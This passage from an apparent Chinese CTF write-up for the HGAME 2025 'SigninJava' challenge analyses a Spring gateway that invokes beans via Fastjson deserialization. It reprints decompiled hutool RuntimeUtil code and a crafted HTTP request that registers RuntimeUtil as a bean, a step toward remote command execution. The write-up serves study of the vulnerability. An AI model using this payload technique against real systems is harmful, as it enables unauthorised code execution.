style=color:#a6e22e>equals</span>(parameterType) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>Set.<span style=color:#a6e22e>class</span>.<span style=color:#a6e22e>equals</span>(parameterType) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>Map.<span style=color:#a6e22e>class</span>.<span style=color:#a6e22e>equals</span>(parameterType)) {
</span></span></code></pre></div><p>对于有参数的方法，首先解析出方法的参数类型和参数名称，并且构建一个参数数组<code>parameterArgs</code>来存放实际参数。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>parameterType.<span style=color:#a6e22e>isPrimitive</span>() <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>Date.<span style=color:#a6e22e>class</span>.<span style=color:#a6e22e>equals</span>(parameterType) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>Long.<span style=color:#a6e22e>class</span>.<span style=color:#a6e22e>equals</span>(parameterType) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>Integer.<span style=color:#a6e22e>class</span>.<span style=color:#a6e22e>equals</span>(parameterType) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>Boolean.<span style=color:#a6e22e>class</span>.<span style=color:#a6e22e>equals</span>(parameterType) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>Double.<span style=color:#a6e22e>class</span>.<span style=color:#a6e22e>equals</span>(parameterType) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>Float.<span style=color:#a6e22e>class</span>.<span style=color:#a6e22e>equals</span>(parameterType) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>Short.<span style=color:#a6e22e>class</span>.<span style=color:#a6e22e>equals</span>(parameterType) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>Byte.<span style=color:#a6e22e>class</span>.<span style=color:#a6e22e>equals</span>(parameterType) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>Character.<span style=color:#a6e22e>class</span>.<span style=color:#a6e22e>equals</span>(parameterType) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>String.<span style=color:#a6e22e>class</span>.<span style=color:#a6e22e>equals</span>(parameterType) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>List.<span style=color:#a6e22e>class</span>.<span style=color:#a6e22e>equals</span>(parameterType) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>Set.<span style=color:#a6e22e>class</span>.<span style=color:#a6e22e>equals</span>(parameterType) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>Map.<span style=color:#a6e22e>class</span>.<span style=color:#a6e22e>equals</span>(parameterType)) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (params.<span style=color:#a6e22e>containsKey</span>(parameterName)) {
</span></span><span style=display:flex><span>        parameterArgs<span style=color:#f92672>[</span>i<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> JSON.<span style=color:#a6e22e>parseObject</span>(JSON.<span style=color:#a6e22e>toJSONString</span>(params.<span style=color:#a6e22e>get</span>(parameterName)), (Class) parameterType, autoTypeFilter, <span style=color:#66d9ef>new</span> JSONReader.<span style=color:#a6e22e>Feature</span><span style=color:#f92672>[</span>0<span style=color:#f92672>]</span>);
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>            parameterArgs<span style=color:#f92672>[</span>i<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> JSON.<span style=color:#a6e22e>parseObject</span>(JSON.<span style=color:#a6e22e>toJSONString</span>(params), (Class) parameterType, autoTypeFilter, <span style=color:#66d9ef>new</span> JSONReader.<span style=color:#a6e22e>Feature</span><span style=color:#f92672>[</span>0<span style=color:#f92672>]</span>);
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (JSONException e) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> (Map.<span style=color:#a6e22e>Entry</span><span style=color:#f92672>&lt;</span>String, Object<span style=color:#f92672>&gt;</span> entry : params.<span style=color:#a6e22e>entrySet</span>()) {
</span></span><span style=display:flex><span>                Object value <span style=color:#f92672>=</span> entry.<span style=color:#a6e22e>getValue</span>();
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> ((value <span style=color:#66d9ef>instanceof</span> String) <span style=color:#f92672>&amp;&amp;</span> ((String) value).<span style=color:#a6e22e>contains</span>(<span style=color:#e6db74>&#34;\&#34;&#34;</span>)) {
</span></span><span style=display:flex><span>                    params.<span style=color:#a6e22e>put</span>(entry.<span style=color:#a6e22e>getKey</span>(), JSON.<span style=color:#a6e22e>parse</span>((String) value));
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            parameterArgs<span style=color:#f92672>[</span>i<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> JSON.<span style=color:#a6e22e>parseObject</span>(JSON.<span style=color:#a6e22e>toJSONString</span>(params), (Class) parameterType, autoTypeFilter, <span style=color:#66d9ef>new</span> JSONReader.<span style=color:#a6e22e>Feature</span><span style=color:#f92672>[</span>0<span style=color:#f92672>]</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    parameterArgs<span style=color:#f92672>[</span>i<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> params.<span style=color:#a6e22e>getOrDefault</span>(parameterName, <span style=color:#66d9ef>null</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>如果方法参数类型不是基础类型（如<code>String</code>, <code>Integer</code>, <code>List</code>等），则尝试使用Fastjson的<code>parseObject</code>将<code>params</code>中的相应字段反序列化为目标参数类型。</p><ul><li>使用<code>autoTypeFilter</code>：在反序列化过程中，使用<code>autoTypeFilter</code>来避免类型安全问题。</li><li>如果<code>params</code>中不存在该参数名，则尝试将整个<code>params</code>映射到目标类型。</li><li>如果解析失败（<code>JSONException</code>），则通过递归尝试解析参数内嵌的JSON字符串。</li></ul><p>对于基础类型（包括<code>String</code>、<code>Integer</code>、<code>Boolean</code>等），直接从<code>params</code>中获取对应的值。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>return</span> beanMethod.<span style=color:#a6e22e>invoke</span>(beanObject, parameterArgs);
</span></span></code></pre></div><p>这个是触发点，利用下面这个类</p><p><img alt=2025-02-22180854 loading=lazy src=/posts/ctf/hgame2025/2025-02-22180854.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> cn.hutool.core.util;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> cn.hutool.core.exceptions.UtilException;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> cn.hutool.core.io.IORuntimeException;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> cn.hutool.core.io.IoUtil;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> cn.hutool.core.lang.Pid;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> cn.hutool.core.text.StrBuilder;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.Closeable;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.File;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.IOException;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.InputStream;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.charset.Charset;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.ArrayList;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.List;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Stack;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>/* loaded from: SigninJava.jar:BOOT-INF/lib/hutool-all-5.8.33.jar:cn/hutool/core/util/RuntimeUtil.class */</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>RuntimeUtil</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> String <span style=color:#a6e22e>execForStr</span>(String... cmds) <span style=color:#66d9ef>throws</span> IORuntimeException {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> execForStr(CharsetUtil.<span style=color:#a6e22e>systemCharset</span>(), cmds);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> String <span style=color:#a6e22e>execForStr</span>(Charset charset, String... cmds) <span style=color:#66d9ef>throws</span> IORuntimeException {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> getResult(exec(cmds), charset);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> List<span style=color:#f92672>&lt;</span>String<span style=color:#f92672>&gt;</span> <span style=color:#a6e22e>execForLines</span>(String... cmds) <span style=color:#66d9ef>throws</span> IORuntimeException {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> execForLines(CharsetUtil.<span style=color:#a6e22e>systemCharset</span>(), cmds);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> List<span style=color:#f92672>&lt;</span>String<span style=color:#f92672>&gt;</span> <span style=color:#a6e22e>execForLines</span>(Charset charset, String... cmds) <span style=color:#66d9ef>throws</span> IORuntimeException {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> getResultLines(exec(cmds), charset);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> Process <span style=color:#a6e22e>exec</span>(String... cmds) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>            Process process <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ProcessBuilder(handleCmds(cmds)).<span style=color:#a6e22e>redirectErrorStream</span>(<span style=color:#66d9ef>true</span>).<span style=color:#a6e22e>start</span>();
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> process;
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (IOException e) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IORuntimeException(e);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> Process <span style=color:#a6e22e>exec</span>(String<span style=color:#f92672>[]</span> envp, String... cmds) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> exec(envp, <span style=color:#66d9ef>null</span>, cmds);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> Process <span style=color:#a6e22e>exec</span>(String<span style=color:#f92672>[]</span> envp, File dir, String... cmds) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> Runtime.<span style=color:#a6e22e>getRuntime</span>().<span style=color:#a6e22e>exec</span>(handleCmds(cmds), envp, dir);
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (IOException e) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IORuntimeException(e);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> List<span style=color:#f92672>&lt;</span>String<span style=color:#f92672>&gt;</span> <span style=color:#a6e22e>getResultLines</span>(Process process) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> getResultLines(process, CharsetUtil.<span style=color:#a6e22e>systemCharset</span>());
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> List<span style=color:#f92672>&lt;</span>String<span style=color:#f92672>&gt;</span> <span style=color:#a6e22e>getResultLines</span>(Process process, Charset charset) {
</span></span><span style=display:flex><span>        InputStream in <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>            in <span style=color:#f92672>=</span> process.<span style=color:#a6e22e>getInputStream</span>();
</span></span><span style=display:flex><span>            List<span style=color:#f92672>&lt;</span>String<span style=color:#f92672>&gt;</span> list <span style=color:#f92672>=</span> (List) IoUtil.<span style=color:#a6e22e>readLines</span>(in, charset, <span style=color:#66d9ef>new</span> ArrayList());
</span></span><span style=display:flex><span>            IoUtil.<span style=color:#a6e22e>close</span>((Closeable) in);
</span></span><span style=display:flex><span>            destroy(process);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> list;
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (Throwable th) {
</span></span><span style=display:flex><span>            IoUtil.<span style=color:#a6e22e>close</span>((Closeable) in);
</span></span><span style=display:flex><span>            destroy(process);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> th;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> String <span style=color:#a6e22e>getResult</span>(Process process) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> getResult(process, CharsetUtil.<span style=color:#a6e22e>systemCharset</span>());
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> String <span style=color:#a6e22e>getResult</span>(Process process, Charset charset) {
</span></span><span style=display:flex><span>        InputStream in <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>            in <span style=color:#f92672>=</span> process.<span style=color:#a6e22e>getInputStream</span>();
</span></span><span style=display:flex><span>            String read <span style=color:#f92672>=</span> IoUtil.<span style=color:#a6e22e>read</span>(in, charset);
</span></span><span style=display:flex><span>            IoUtil.<span style=color:#a6e22e>close</span>((Closeable) in);
</span></span><span style=display:flex><span>            destroy(process);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> read;
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (Throwable th) {
</span></span><span style=display:flex><span>            IoUtil.<span style=color:#a6e22e>close</span>((Closeable) in);
</span></span><span style=display:flex><span>            destroy(process);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> th;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> String <span style=color:#a6e22e>getErrorResult</span>(Process process) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> getErrorResult(process, CharsetUtil.<span style=color:#a6e22e>systemCharset</span>());
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> String <span style=color:#a6e22e>getErrorResult</span>(Process process, Charset charset) {
</span></span><span style=display:flex><span>        InputStream in <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>            in <span style=color:#f92672>=</span> process.<span style=color:#a6e22e>getErrorStream</span>();
</span></span><span style=display:flex><span>            String read <span style=color:#f92672>=</span> IoUtil.<span style=color:#a6e22e>read</span>(in, charset);
</span></span><span style=display:flex><span>            IoUtil.<span style=color:#a6e22e>close</span>((Closeable) in);
</span></span><span style=display:flex><span>            destroy(process);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> read;
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (Throwable th) {
</span></span><span style=display:flex><span>            IoUtil.<span style=color:#a6e22e>close</span>((Closeable) in);
</span></span><span style=display:flex><span>            destroy(process);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> th;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>destroy</span>(Process process) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>null</span> <span style=color:#f92672>!=</span> process) {
</span></span><span style=display:flex><span>            process.<span style=color:#a6e22e>destroy</span>();
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>addShutdownHook</span>(Runnable hook) {
</span></span><span style=display:flex><span>        Runtime.<span style=color:#a6e22e>getRuntime</span>().<span style=color:#a6e22e>addShutdownHook</span>(hook <span style=color:#66d9ef>instanceof</span> Thread <span style=color:#f92672>?</span> (Thread) hook : <span style=color:#66d9ef>new</span> Thread(hook));
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>getProcessorCount</span>() {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> cpu <span style=color:#f92672>=</span> Runtime.<span style=color:#a6e22e>getRuntime</span>().<span style=color:#a6e22e>availableProcessors</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (cpu <span style=color:#f92672>&lt;=</span> 0) {
</span></span><span style=display:flex><span>            cpu <span style=color:#f92672>=</span> 7;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> cpu;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>long</span> <span style=color:#a6e22e>getFreeMemory</span>() {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> Runtime.<span style=color:#a6e22e>getRuntime</span>().<span style=color:#a6e22e>freeMemory</span>();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>long</span> <span style=color:#a6e22e>getTotalMemory</span>() {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> Runtime.<span style=color:#a6e22e>getRuntime</span>().<span style=color:#a6e22e>totalMemory</span>();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>long</span> <span style=color:#a6e22e>getMaxMemory</span>() {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> Runtime.<span style=color:#a6e22e>getRuntime</span>().<span style=color:#a6e22e>maxMemory</span>();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>long</span> <span style=color:#a6e22e>getUsableMemory</span>() {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> (getMaxMemory() <span style=color:#f92672>-</span> getTotalMemory()) <span style=color:#f92672>+</span> getFreeMemory();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>getPid</span>() <span style=color:#66d9ef>throws</span> UtilException {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> Pid.<span style=color:#a6e22e>INSTANCE</span>.<span style=color:#a6e22e>get</span>();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> String<span style=color:#f92672>[]</span> <span style=color:#a6e22e>handleCmds</span>(String... cmds) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (ArrayUtil.<span style=color:#a6e22e>isEmpty</span>((Object<span style=color:#f92672>[]</span>) cmds)) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> NullPointerException(<span style=color:#e6db74>&#34;Command is empty !&#34;</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (1 <span style=color:#f92672>==</span> cmds.<span style=color:#a6e22e>length</span>) {
</span></span><span style=display:flex><span>            String cmd <span style=color:#f92672>=</span> cmds<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (StrUtil.<span style=color:#a6e22e>isBlank</span>(cmd)) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> NullPointerException(<span style=color:#e6db74>&#34;Command is blank !&#34;</span>);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            cmds <span style=color:#f92672>=</span> cmdSplit(cmd);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> cmds;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> String<span style=color:#f92672>[]</span> <span style=color:#a6e22e>cmdSplit</span>(String cmd) {
</span></span><span style=display:flex><span>        List<span style=color:#f92672>&lt;</span>String<span style=color:#f92672>&gt;</span> cmds <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ArrayList<span style=color:#f92672>&lt;&gt;</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> length <span style=color:#f92672>=</span> cmd.<span style=color:#a6e22e>length</span>();
</span></span><span style=display:flex><span>        Stack<span style=color:#f92672>&lt;</span>Character<span style=color:#f92672>&gt;</span> stack <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Stack<span style=color:#f92672>&lt;&gt;</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>boolean</span> inWrap <span style=color:#f92672>=</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>        StrBuilder cache <span style=color:#f92672>=</span> StrUtil.<span style=color:#a6e22e>strBuilder</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> 0; i <span style=color:#f92672>&lt;</span> length; i<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>char</span> c <span style=color:#f92672>=</span> cmd.<span style=color:#a6e22e>charAt</span>(i);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>switch</span> (c) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39; &#39;</span>:
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> (inWrap) {
</span></span><span style=display:flex><span>                        cache.<span style=color:#a6e22e>append</span>(c);
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>                    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>                        cmds.<span style=color:#a6e22e>add</span>(cache.<span style=color:#a6e22e>toString</span>());
</span></span><span style=display:flex><span>                        cache.<span style=color:#a6e22e>reset</span>();
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;\&#34;&#39;</span>:
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;\&#39;&#39;</span>:
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> (inWrap) {
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>if</span> (c <span style=color:#f92672>==</span> stack.<span style=color:#a6e22e>peek</span>().<span style=color:#a6e22e>charValue</span>()) {
</span></span><span style=display:flex><span>                            stack.<span style=color:#a6e22e>pop</span>();
</span></span><span style=display:flex><span>                            inWrap <span style=color:#f92672>=</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>                        }
</span></span><span style=display:flex><span>                        cache.<span style=color:#a6e22e>append</span>(c);
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>                    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>                        stack.<span style=color:#a6e22e>push</span>(Character.<span style=color:#a6e22e>valueOf</span>(c));
</span></span><span style=display:flex><span>                        cache.<span style=color:#a6e22e>append</span>(c);
</span></span><span style=display:flex><span>                        inWrap <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>default</span>:
</span></span><span style=display:flex><span>                    cache.<span style=color:#a6e22e>append</span>(c);
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (cache.<span style=color:#a6e22e>hasContent</span>()) {
</span></span><span style=display:flex><span>            cmds.<span style=color:#a6e22e>add</span>(cache.<span style=color:#a6e22e>toString</span>());
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> (String<span style=color:#f92672>[]</span>) cmds.<span style=color:#a6e22e>toArray</span>(<span style=color:#66d9ef>new</span> String<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>POST /api/gateway HTTP/1.1
</span></span><span style=display:flex><span>Host: node1.hgame.vidar.club:31791
</span></span><span style=display:flex><span>Accept-Language: zh-CN,zh;q<span style=color:#f92672>=</span>0.9,en;q<span style=color:#f92672>=</span>0.8,en-GB;q<span style=color:#f92672>=</span>0.7,en-US;q<span style=color:#f92672>=</span>0.6
</span></span><span style=display:flex><span>Cache-Control: max-age<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; Win64; x64<span style=color:#f92672>)</span> AppleWebKit/537.36 <span style=color:#f92672>(</span>KHTML, like Gecko<span style=color:#f92672>)</span> Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/avif,image/webp,image/apng,*/*;q<span style=color:#f92672>=</span>0.8,application/signed-exchange;v<span style=color:#f92672>=</span>b3;q<span style=color:#f92672>=</span>0.7
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Content-Type: application/json
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>{</span><span style=color:#e6db74>&#34;beanName&#34;</span>:<span style=color:#e6db74>&#34;cn.hutool.extra.spring.SpringUtil&#34;</span>,<span style=color:#e6db74>&#34;methodName&#34;</span>:<span style=color:#e6db74>&#34;registerBean&#34;</span>,<span style=color:#e6db74>&#34;params&#34;</span>:<span style=color:#f92672>{</span><span style=color:#e6db74>&#34;arg0&#34;</span>:<span style=color:#e6db74>&#34;shell&#34;</span>,<span style=color:#e6db74>&#34;arg1&#34;</span>:<span style=color:#f92672>{</span><span style=color:#e6db74>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;cn.hutool.core.util.RuntimeUtil&#34;</span><span style=color:#f92672>}}}</span>
